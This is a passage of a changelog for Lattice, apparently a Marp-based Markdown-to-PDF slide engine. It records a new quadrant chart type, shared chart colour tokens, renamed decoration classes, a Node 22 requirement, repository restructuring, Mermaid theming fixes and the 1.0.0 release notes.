  without escaping `<`/`>`/`&`, so authors who wrote sample HTML in
  inline code (e.g. `` `<section>` ``) ended up with the browser
  parsing literal text as real nested DOM elements, breaking page
  layout. Now escapes per standard markdown behaviour.
- **Overflow watcher scoped to Marp sections.** The watchers in
  `lattice-emulator.js` and `lattice-runtime.js` now select
  `section[data-lattice-slide]` instead of every `section`, so any
  literal `<section>` text that does end up in the DOM no longer
  pollutes the warning indices. Same scope applied to the
  per-section sizing override.

- **`quadrant` chart-family member.** Native 2×2 scatter chart joining
  the existing chart-family (progress / timeline-list / piechart /
  gantt / kanban / radar). Group-by-quadrant nested-list authoring;
  top-level items label the four corners in reading order (TL → TR →
  BL → BR), nested items carry a trailing `x, y` coord pill plotted
  inside the chart. Per-axis scale + threshold-line targets read from
  the eyebrow (`Effort 0–10 → Reach 0–100 · targets 6, 75`); falls
  back to auto-fit nice-ceil when omitted.

  Five modifier variants beyond the default:

  - `bubble` — third comma-separated value per item √-scales the dot
    (area-honest); numeric pill renders inside large bubbles.
  - `trail` — two coord pills per item; faded ring + dashed connector
    + solid dot reads "what moved" without an annotation.
  - `cohort` — top-level groups become cohorts; convex-hull region
    tints each cohort's footprint with a centroid label.
  - `threshold` — midlines replaced by explicit dashed target lines;
    four zones default to Star / On Pace / Lagging / At Risk.
  - `magic` — Gartner Magic Quadrant tribute with the canonical
    CHALLENGERS / LEADERS / NICHE PLAYERS / VISIONARIES vocabulary as
    fallback corner names.

  Palette flows through the existing `--c-quadrant-N-fill` /
  `--c-quadrant-N-text` theme aliases (AA-paired per slot). `minimal`
  and `dark` composable cross-cutting modifiers ride on top of any
  variant. Title-area styling defaults to the chart-frame `.minimal`
  treatment (centred accent hairline, no lucent gradient) — the dense
  scatter benefits from less chrome above the plot.

  Three-renderer kernel parity enforced as for radar: `lib/quadrant.js`
  is canonical; `lattice-emulator.js` inlines the build-path dispatch;
  `lattice-runtime.js` mirrors the kernel for the marp-vscode preview.
  Feature deck at `examples/quadrant.md` (+ committed PDF) demos every
  variant. Unit coverage in `test/unit/quadrant.test.js` (47 tests)
  covers parsing, eyebrow grammar, geometry, every variant, and
  chart-family integration. Reference doc:
  `docs/references/templates.md#quadrant`.

### Changed

- **Categorical charts recoloured onto a shared fill/mark model.**
  Quadrant, piechart, radar, and progress now draw from one chart-family
  colour contract (`--catN-fill` / `--catN-ink`, defined in
  `_chart-family.css`): each slot is a single curated hue rendered as a
  restrained *tint* fill plus a saturated, contrasting *mark* — pale tint
  + deep same-hue mark on a light canvas, and a muted **deep** tint +
  brighter (white-lifted) same-hue mark on a dark canvas. Both modes are
  equally restrained: the dark side is the light side's tint model
  inverted, not the hue painted at full strength (which read as a clashing
  Excel-default palette across 8 categories). Fill and mark always share a
  hue and the relationship flips automatically with the canvas, so the
  charts stay refined and on-palette in both modes. Quadrant
  cells map reading-order to slots 1–4; piechart wedges/legend swatches
  gain coloured borders; radar curves now draw from the chart spectrum
  (`--catN-hue`) like the other members, in both modes; progress's neutral
  bar uses the first slot hue (status bars still use pass/warn/fail).
  Quadrant text labels are neutral `--text-heading` ink (AA-safe) with a
  `--bg` halo. Both the native quadrant component and the Mermaid
  `quadrantChart` theme map now read the `cN` palette directly (see the
  removed `--c-quadrant-*` tokens below).
- **Piechart and quadrant fills unified onto radar's vivid area-fade
  model.** The three categorical charts now share one fill language. Pie/
  donut wedges previously rode the pale `--catN-fill` tint (which read
  pastel/washed-out); they now ride the vivid slot hue (`--catN-hue` — the
  canvas-saturated end radar strokes its curves with) as a hub→rim radial
  area-fade (lighter at the hub, vivid toward the rim), denser than radar's
  translucent overlay because wedges are opaque part-to-whole areas. Legend
  swatches become solid vivid chips matching the wedge identity. Quadrant
  zone fills now match the pie wedges exactly — the SAME opaque hub→rim mix
  of `--catN-hue` with `--bg` (42% at the axis crossing → 82% at the outer
  corners), replacing the former translucent wash, so the four zones read
  as vivid as the pie. The on-field labels take maximum-contrast ink
  (`--quadrant-label-ink`: true black on light, true white on dark via
  `light-dark()`) with no halo — a `--bg` halo reads as a visible outline on
  the saturated zones, and softened `--text-heading` reads a touch light, so
  pure black/white carries the labels on its own; only the dot/bubble marker
  rings keep a thin `--bg` ring (to stay visible on their same-hue zone). All
  three charts share the same `--catN-hue` source and
  hub→rim fade, so radar, pie, and quadrant read as one family on both
  canvases. Render-path + CSS only (no token or authoring change).
- **Documentation reorganized into two trees.** The internal engineering
  and design references moved from `docs/` to `reference/` (with the
  former `docs/references/` becoming `engineering/`), freeing
  `docs/` for the new public documentation site. All cross-references —
  CLAUDE.md, generators, the npm `files` list, tooling, and links — were
  updated accordingly.
- **BREAKING: `bg-*` decoration classes renamed to `tint-*` / `mark-*`.**
  The Background Library is now the Treatment Library, split into two
  semantic families: 12 `tint-*` gradient washes (corner glows, edge
  washes, atmospheric, multi-accent) and 11 `mark-*` SVG accent shapes,
  plus a `treatment-none` reset (was `bg-none`). `tint-corner` and
  `tint-edge` now carry an `at-*` placement axis — write
  `tint-corner at-tl` (was `bg-corner-tl`), `tint-edge at-right`
  (was `bg-edge-right`), etc. Both long and short forms are accepted
  (`at-tl` ≡ `top-left`), with a per-layer escape hatch (`tint-at-tl`)
  for composing two tints at different placements. Marks render at a
  fixed default home in v1 (e.g. `mark-orbit` defaults to bottom-right,
  matching the old `bg-orbit-br` position); writing `at-*` alongside a
  mark is silently ignored. The mark placement axis is a v2 follow-up.
  No alias period — `bg-*` classes are removed in this release. Source
  file renamed `lib/base/base.decorations.css` → `lib/base/base.treatments.css`;
  doc renamed `docs/references/backgrounds.md` → `docs/references/treatments.md`.
  Three marks switched rendering mechanism along the way because Apple
  PDFKit drops Chromium-emitted `mask-image` constructs unreliably:
  `mark-ticks` and `mark-pills` paint via `::before` + `box-shadow`
  copies (no mask), and `mark-seeds` paints as 12 stacked
  radial-gradients in the `--_bg-radial` slot. See
  `docs/references/treatments.md` for the catalogue,
  `docs/notes/2026-05-17-treatments-rename.md` for the rationale, and
  `docs/references/gotchas.md` → "Chromium PDF output of CSS
  `mask-image` renders inconsistently across viewers" for the
  underlying browser/PDF behaviour. Author migration: search-and-
  replace the `bg-X` class with its `tint-*` / `mark-*` equivalent
  per the table in the rename note.

- **BREAKING: Node 22 is now the minimum supported runtime.** `engines.node`
  bumped from `>=18.0.0` to `>=22.0.0`; CI matrix narrowed from `[18, 20, 22, 24]`
  to `[22, 24]`. Node 18 has been EOL since April 2025; Node 20 entered
  maintenance in April 2026. Lattice's test infrastructure now uses
  `node --test` glob arguments (Node 21+) and `describe({ concurrency: true })`
  (Node 20.10+) — supporting older versions would mean freezing into a
  pre-Node-21 API forever. Consumers on Node 18 or 20 should pin to
  Lattice 1.x.

- **Repository reorganization (pre-release).** The project layout was
  flattened, renamed, and re-tested in eight phases. Because Lattice
  has not been released into the wild, every change is a clean break
  with no aliases or compatibility shims.

  - `lattice.js` → `lattice-emulator.js`. The build-time renderer no
    longer steals the engine's name; `lattice` now refers to the CSS
    layouts + runtime + theming contract, `lattice-emulator` to the
    Marp-emulating PDF shim.
  - Documentation collapsed into `docs/`: `ARCHITECTURE.md`,
    `THEMING.md`, `EDITORIAL.md`, `SKILL.md`, and `references/` all
    moved under `docs/`. New `docs/notes/` folder for durable
    developer/agent investigation notes; the prior repo-root
    `AgentNote.md` is its first inhabitant.
  - `screenshot-slides.js` moved to `tools/`. The `.test/` folder of
    ad-hoc probe scripts (~85 files of historical investigation) was
    deleted along with stale `examples/*.html` and `examples/*.pptx`
    artifacts; `examples/*.html` is now gitignored.
  - Test runner switched from a single `smoke-test.js` to `node:test`
    with two tiers under `test/`: `unit/` (fast, no child processes —
    `npm test`) and `integration/` (rebuilds both galleries through
    both renderers — `npm run test:integration`). Shared plumbing
    lives under `test/helpers/`; the page-count contract lives in
    `test/fixtures/expected-page-counts.json`.
  - Test coverage expanded with `mermaid-var-map.test.js`, which
    extracts every CSS-var reference from the emulator's
    `MERMAID_VAR_MAP` and asserts both palettes define each token,
    plus `marp.gallery.test.js` and `parity.test.js` to assert
    cross-renderer agreement on slide count.
  - `@marp-team/marp-cli` promoted from `devDependencies` to
    `dependencies`. Lattice's runtime/preview path explicitly targets
    marp-cli output and the integration suite spawns it; there is no
    "lattice without marp" mode worth supporting.

### Removed

- **Breaking: the `--c-quadrant-N-fill` / `--c-quadrant-N-text` palette
  tokens are removed from every theme.** Quadrant charts (native and the
  Mermaid `quadrantChart` theme map) now read the `cN` categorical palette
  directly through the shared chart-family colour model, so the bespoke
  per-quadrant slot tokens — and their separate per-theme hue tuning — no
  longer exist. Consumers that overrode `--c-quadrant-*` must tune the `cN`
  palette instead. The `palette`/`contrast` unit suites no longer require
  or assert these tokens.

### Fixed

- **Quadrant chart internal border drift.** The emulator's
  `MERMAID_VAR_MAP` referenced `--mermaid-mid-slate` for
  `quadrantInternalBorderStrokeFill`, but no palette defined that
  token, so Mermaid silently fell back to its default colour. Pointed
  the entry at `--cat-slate` to match what `lattice-runtime.js`
  already uses for the same role. Caught by the new
  `mermaid-var-map.test.js`.

### Earlier (Unreleased)

- **Mermaid runtime: removed source-restoration anti-pattern; SSR-highlighted source
  doubles as the failure-mode UI.** `lattice-runtime.js` previously destroyed the
  `<pre><code>` Marp emitted, replaced it with `<div class="mermaid">`, then on parse
  failure copied a stashed `data-ll-source` back into the div as plaintext — losing
  Marp's native code styling and showing unstyled grey text on the slide. The new
  `wrapFences()` keeps the `<pre>` intact and adds a sibling `<div class="mermaid">`
  inside a `<div class="mermaid-block" data-state="…">` wrapper. CSS toggles
  visibility off `data-state` (`pending` → `rendered` hides pre / shows svg, `error`
  keeps pre visible and surfaces a themed `.mermaid-error` block with parser cause
  text). `initAndRun()` now drives `mermaid.render(id, source)` per-fence with
  per-block try/catch instead of a single `mermaid.run({nodes, suppressErrors:true})`.
- **Mermaid fences are now syntax-highlighted at SSR time.** Added
  `lib/mermaid-hljs.js`, a highlight.js language definition (diagram openers as
  `hljs-section`, keywords spanning flowchart/sequence/class/state/er/gantt/journey/
  pie/git/mindmap/timeline/kanban/quadrant/requirement/c4/architecture/packet/sankey/
  radar/xychart/block, frontmatter + `%%{init}%%` as `hljs-meta`, arrows + ER
  cardinalities as `hljs-operator`, strings, numbers, hex colors, HTML tags). Wired
  into marp-core's bundled hljs via a `registerMermaidHljs(marp)` engine hook in
  `marp.config.js`; marp's default `highlighter` picks it up automatically. Mermaid
  source now renders with the same hljs token classes as JS/Python/etc., including
  in marp-vscode preview when the same hljs language is registered there.

### Fixed

- **Mermaid theming gaps across 7 diagram types.** A full marp-cli + Puppeteer audit
  across 5 decks (37 diagrams) found 35 stray colors that escaped the brand palette:
  X11 named colors on journey actor avatars (cyan/lawngreen/darkseagreen), Tableau-10
  hardcoded palette on sankey nodes and link gradients, Mermaid's #087EBF service blue
  on architecture, the C4 dark-blue cycle on inner rects/labels, lightened cScale
  derivatives on mindmap and timeline `line.node-line-N` connectors, #EFEFEF on
  packet blocks, and a Mermaid-derived #F0F5FB on ER `g.row-rect-even` that drifted
  from `--bg-alt`. None of these were reachable through `themeVariables` — Mermaid
  bypasses the variable cascade for these surfaces. Added per-diagram-type CSS
  overrides to `themes/indaco.css` and `themes/cuoio.css` (journey faces/circles/
  strokes, c4 prefix-class catchall via `[class*="person"]`/`[class*="system"]`,
  mindmap+timeline connector strokes, sankey nodes/labels/links, packet blocks,
  architecture services/glyphs/edges, ER row-rect alternation). Tokenized the radar
  warm-orange contrast accent as `--mermaid-accent-warm` so audits recognize it.
  Audit verified deterministic across 3 rounds: 0 strays, 0 missing SVGs, 37/37
  diagrams on palette. Smoke test still passes (42 + 38 pages).
- **Silent diagram failures in browser runtime.** `lattice-runtime.js` was passing
  `layout: "tidy-tree"` to `mermaid.initialize()`, which is not a valid Mermaid 11
  layout algorithm (only `dagre` and `elk` are recognized). Mermaid threw
  "Unknown layout algorithm" mid-render, but `suppressErrorRendering: true` swallowed
  the error — leaving state, ER, class, and several other diagram types with
  `data-processed=true` but no SVG. Removed the bogus `layout` option; each diagram
  now picks its native layout. Verified with a synthetic Puppeteer harness covering
  cold load, section-replace, and in-place edits across both `<marp-pre>` and `<pre>`
  wrappers (8/8 deterministic across 3 runs each).

## 1.0.0

Initial public release.

### Engine

- Markdown-to-PDF renderer (`lattice-emulator.js`) with Marp-emulated HTML output,
  highlight.js syntax coloring, and per-diagram Mermaid pre-rendering.
- Browser runtime (`lattice-runtime.js`) for live Marp preview and web
  export contexts. Resolves the Mermaid theme from the loaded palette CSS
  at runtime.
- Single source of truth for color: every Mermaid theme variable derives
  from CSS custom properties in the active palette. The structural
  mapping (which Mermaid key gets which palette role) lives in `lattice-emulator.js`
  and does not change when palettes are swapped.

### Theme

- Two palettes: `indaco` (cool indigo, default) and `cuoio` (warm leather).
  Both extend `lattice.css` via `@import 'lattice'` and supply color tokens.
  Pale-cool / pale-warm designs with saturated brand borders and dark ink.
  Saturated red reserved for alarm states (gantt critical, error fills).
  Every other surface stays pale.
- Dark variant tokens (`section.dark` reskin) defined as part of the
  palette, so the same layouts work on either canvas.
- highlight.js syntax tokens defined as palette variables, so a theme
  can change syntax colors alongside slide colors.

### Layouts

- 25+ slide layouts including title, divider, content, diagram, two-column,
  card-grid, comparison, quote, timeline, list, full-bleed, big-number,
  split-panel, closing, finding, code-compare, image-half, stats,
  cards-stacked, criteria, verdict-grid, image-full, three-row, and dark
  variants.
- All layouts are palette-blind: every color reference goes through
  `var(--token)`, no hex literals.

### Mermaid

- Theme support for all 25 renderable Mermaid diagram types. ZenUML is
  documented as a non-renderable type in static-PDF contexts because the
  Mermaid CLI emits HTML/Tailwind classes without bundling the required
  stylesheet.
- Per-diagram CSS overrides for nine diagrams that ignore `themeVariables`
  or have hardcoded internal palettes (journey, mindmap, kanban, c4,
  radar, venn, ishikawa, treemap, plus a flowchart shape-coverage rule
  and a gantt outside-text fix).

### Examples

- `examples/gallery.md` and `gallery.pdf`: 40-slide layout gallery
  demonstrating every slide layout.
- `examples/mermaid-gallery.md` and `mermaid-gallery.pdf`: 31-slide
  diagram gallery covering all 25 Mermaid diagram types.

### Documentation

- `README.md`: project landing.
- `docs/skill.md`: deck authoring contract — layouts, directives, examples.
- `docs/theming.md`: how to author a palette, including the per-diagram
  Mermaid theming surface and parser limits.
- `docs/editorial.md`: prose rules for writing the words on the slides.
- `docs/architecture.md`: engine internals.

### Position in SlideWright

Lattice 1.0.0 is the first repository published under the
[SlideWright](https://github.com/slidewright) organization. Lattice is
the engine layer — the build pipeline, the layouts, the theme system.
The SlideWright desktop app (under development) will wrap this engine
with a GUI for non-developer deck authors.
